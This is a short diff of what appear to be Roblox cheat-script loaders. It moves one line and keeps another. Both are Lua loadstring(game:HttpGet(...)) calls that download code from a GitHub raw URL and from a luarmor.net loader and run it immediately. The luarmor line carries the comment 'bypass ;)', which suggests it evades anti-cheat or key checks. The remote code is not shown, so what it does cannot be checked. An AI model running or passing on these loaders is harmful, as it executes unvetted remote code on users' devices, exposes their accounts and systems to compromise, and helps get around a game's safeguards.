@@ -1,3 +1,3 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/BaconBossScript/Crazy/main/Crazy'),true))()
-
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/8c43b694d4317ca1e4239290310ee3d0.lua"))() -- bypass ;) yk me :shrug:
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/BaconBossScript/Crazy/main/Crazy'),true))()
